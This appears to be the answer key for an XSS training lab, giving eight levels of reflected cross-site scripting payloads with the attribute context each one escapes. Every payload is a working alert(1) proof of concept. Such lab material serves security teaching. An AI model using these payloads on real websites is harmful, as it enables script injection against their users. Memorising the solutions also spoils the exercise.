# specialtag — solutions

Reflections inside attributes of less-common tags (option, meta, button, base, img alt, iframe srcdoc, object, unquoted img src).

### specialtag-level1

`/specialtag/level1/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<option value="...">`; attribute breakout

### specialtag-level2

`/specialtag/level2/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<meta name="description" content="...">`; breakout

### specialtag-level3

`/specialtag/level3/?query=%22%20formaction=javascript:alert(1)%20x=%22`

- payload: `" formaction=javascript:alert(1) x="`
- context: `<button value="...">` inside form; formaction attribute fires on submit

### specialtag-level4

`/specialtag/level4/?query=javascript:alert(1)//`

- payload: `javascript:alert(1)//`
- context: `<base href="...">`; subsequent `<a href="/test">` becomes javascript: URL

### specialtag-level5

`/specialtag/level5/?query=%22%20onload=alert(1)%20x=%22`

- payload: `" onload=alert(1) x="`
- context: `<img alt="...">`; angle brackets stripped — quote breakout

### specialtag-level6

`/specialtag/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: `<iframe srcdoc="...">`; HTML inside srcdoc executes

### specialtag-level7

`/specialtag/level7/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: `<object data="...">`; javascript URL

### specialtag-level8

`/specialtag/level8/?query=x%20onerror=alert(1)`

- payload: `x onerror=alert(1)`
- context: unquoted `<img src=... alt=image>`; space adds onerror attribute
